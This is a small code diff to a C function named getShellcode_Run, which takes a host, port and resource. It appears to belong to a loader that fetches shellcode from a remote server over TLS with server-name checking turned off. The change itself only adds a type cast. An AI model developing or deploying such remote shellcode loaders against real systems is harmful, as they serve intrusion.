@@ -442,7 +442,7 @@ void getShellcode_Run(char* host, char* port, char* resource) {
     schannelCred.dwFlags = SCH_CRED_NO_SERVERNAME_CHECK;
 
     TimeStamp tsExpiry;
-    secStatus = AcquireCredentialsHandleA(NULL, UNISP_NAME_A, SECPKG_CRED_OUTBOUND, 
+    secStatus = AcquireCredentialsHandleA(NULL, (LPSTR)UNISP_NAME_A, SECPKG_CRED_OUTBOUND, 
                                           NULL, &schannelCred, NULL, NULL, &hCred, &tsExpiry);
     if (secStatus != SEC_E_OK) {
         DebugLog("AcquireCredentialsHandle failed: %x\n", secStatus);
